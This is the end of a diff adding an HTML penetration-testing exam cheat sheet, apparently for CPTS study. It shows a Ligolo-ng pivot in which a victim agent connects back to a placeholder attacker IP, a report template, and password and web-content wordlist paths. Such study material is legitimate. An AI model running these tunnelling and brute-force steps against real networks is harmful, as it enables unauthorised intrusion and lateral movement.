+      <h2>Ligolo-ng</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code># Attacker
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# Victim
+./agent -connect &lt;attacker_IP&gt;:11601 -ignore-cert
+
+# In ligolo console: session → start
+# ip route add &lt;target_subnet&gt;/24 dev ligolo</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- REPORTING -->
+    <div class="section" id="s-reporting">
+      <h1>Report Template</h1>
+      <div class="alert green">Start report on Day 1! Never leave it to the last day.</div>
+      <h2>Required Sections</h2>
+      <ul>
+        <li><strong>Executive Summary</strong> — non-technical overview, business impact</li>
+        <li><strong>Scope & Methodology</strong> — what was tested, how</li>
+        <li><strong>Attack Chain / Narrative</strong> — story of the compromise</li>
+        <li><strong>Findings</strong> — each vulnerability with evidence</li>
+        <li><strong>Recommendations</strong> — how to fix each finding</li>
+        <li><strong>Appendix</strong> — tool outputs, additional evidence</li>
+      </ul>
+      <h2>Per-Finding Template</h2>
+      <table>
+        <tr><th>Field</th><th>Content</th></tr>
+        <tr><td>Title</td><td>Short descriptive name</td></tr>
+        <tr><td>Severity</td><td>Critical / High / Medium / Low / Info</td></tr>
+        <tr><td>Description</td><td>What it is, why it's bad</td></tr>
+        <tr><td>Evidence</td><td>Screenshots, command output</td></tr>
+        <tr><td>Steps to Reproduce</td><td>Exact steps taken</td></tr>
+        <tr><td>Impact</td><td>Business/technical impact</td></tr>
+        <tr><td>Recommendation</td><td>How to fix</td></tr>
+      </table>
+      <h2>Flag Evidence Format</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>hostname && whoami && cat /path/to/flag.txt
+# Screenshot this output for every flag</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- WORDLISTS -->
+    <div class="section" id="s-wordlists">
+      <h1>Wordlists Reference</h1>
+      <h2>Passwords</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>/usr/share/wordlists/rockyou.txt
+/usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt
+/usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Usernames</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>/usr/share/seclists/Usernames/top-usernames-shortlist.txt
+/usr/share/seclists/Usernames/Names/names.txt</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Web</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
+/usr/share/seclists/Discovery/Web-Content/big.txt
+/usr/share/seclists/Discovery/Web-Content/common.txt</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>DNS</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Hashcat Rules</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>/usr/share/hashcat/rules/best64.rule
+/usr/share/hashcat/rules/rockyou-30000.rule</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+const sections=[
+  {id:'home',label:'Home'},{id:'checklist',label:'Exam Day Checklist'},
+  {id:'passive',label:'Passive Recon'},{id:'active',label:'Active Recon'},
+  {id:'nmap',label:'Nmap Cheatsheet'},{id:'services',label:'Service Enum Map'},
+  {id:'ftp-smb',label:'FTP / SMB / NFS'},{id:'dns',label:'DNS'},
+  {id:'smtp',label:'SMTP / IMAP / POP3'},{id:'databases',label:'Databases'},
+  {id:'remote',label:'SSH / RDP / WinRM'},{id:'filetransfer',label:'File Transfers'},
+  {id:'shells',label:'Shells & Payloads'},{id:'metasploit',label:'Metasploit'},
+  {id:'linux-privesc',label:'Linux PrivEsc'},{id:'win-privesc',label:'Windows PrivEsc'},
+  {id:'ad-enum',label:'AD Enumeration'},{id:'ad-attacks',label:'AD Attacks'},
+  {id:'kerberos',label:'Kerberos Attacks'},{id:'web',label:'Web Overview'},
+  {id:'sqli',label:'SQL Injection'},{id:'xss',label:'XSS'},
+  {id:'lfi',label:'LFI / RFI'},{id:'fileupload',label:'File Upload'},
+  {id:'ssrf',label:'SSRF / XXE / SSTI'},{id:'lateral',label:'Lateral Movement'},
+  {id:'postexploit',label:'Post-Exploitation'},{id:'pivoting',label:'Pivoting & Tunneling'},
+  {id:'reporting',label:'Report Template'},{id:'wordlists',label:'Wordlists'}
+];
+const icons={home:'🏠',checklist:'✅',passive:'🔭',active:'📡',nmap:'🔍',services:'🗺️','ftp-smb':'📂',dns:'🌐',smtp:'📧',databases:'🗄️',remote:'🔌',filetransfer:'📤',shells:'💣',metasploit:'⚙️','linux-privesc':'🐧','win-privesc':'🪟','ad-enum':'🏢','ad-attacks':'⚔️',kerberos:'🎫',web:'🌍',sqli:'💉',xss:'🔥',lfi:'📁',fileupload:'📎',ssrf:'🔗',lateral:'↔️',postexploit:'🎯',pivoting:'🔀',reporting:'📝',wordlists:'📋'};
+
+// Build home grid
+const grid=document.getElementById('home-grid');
+sections.slice(1).forEach(s=>{
+  const c=document.createElement('div');
+  c.className='home-card';
+  c.innerHTML=`<div class="card-icon">${icons[s.id]||'📄'}</div><div class="card-title">${s.label}</div>`;
+  c.addEventListener('click',()=>nav(s.id));
+  grid.appendChild(c);
+});
+
+function nav(id){
+  document.querySelectorAll('.section').forEach(s=>s.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+  const sec=document.getElementById('s-'+id);
+  const navEl=document.querySelector(`.nav-item[data-section="${id}"]`);
+  if(sec)sec.classList.add('active');
+  if(navEl){navEl.classList.add('active');navEl.scrollIntoView({block:'nearest'});}
+  const lbl=sections.find(s=>s.id===id);
+  document.getElementById('bread-current').textContent=lbl?lbl.label.toUpperCase():id.toUpperCase();
+  document.getElementById('content').scrollTop=0;
+}
+
+document.querySelectorAll('.nav-item').forEach(item=>{
+  item.addEventListener('click',()=>nav(item.dataset.section));
+});
+
+// Copy buttons
+document.querySelectorAll('.copy-btn').forEach(btn=>{
+  btn.addEventListener('click',()=>{
+    const pre=btn.closest('.code-wrap').querySelector('pre');
+    const text=pre?pre.innerText.replace(/COPY$/,'').trim():'';
+    navigator.clipboard.writeText(text).then(()=>{
+      btn.textContent='COPIED!';btn.classList.add('copied');
+      setTimeout(()=>{btn.textContent='COPY';btn.classList.remove('copied');},1500);
+    });
+  });
+});
+
+// Search
+const si=document.getElementById('search');
+si.addEventListener('input',function(){
+  const q=this.value.trim().toLowerCase();
+  if(!q){
+    document.querySelectorAll('.nav-item,.nav-group-label,.nav-group').forEach(n=>n.style.display='');
+    return;
+  }
+  document.querySelectorAll('.nav-item').forEach(n=>{
+    n.style.display=n.textContent.toLowerCase().includes(q)?'':'none';
+  });
+  document.querySelectorAll('.nav-group').forEach(g=>{
+    g.style.display=Array.from(g.querySelectorAll('.nav-item')).some(n=>n.style.display!=='none')?'':'none';
+  });
+});
+
+document.addEventListener('keydown',e=>{
+  if(e.key==='/'&&document.activeElement!==si){e.preventDefault();si.focus();}
+  if(e.key==='Escape')si.blur();
+});
+
+// Download button
+document.getElementById('dl-btn').addEventListener('click',()=>{
+  const blob=new Blob([document.documentElement.outerHTML],{type:'text/html'});
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(blob);
+  a.download='CPTS-Vault.html';
+  a.click();
+});
+</script>
+</body>
+</html>
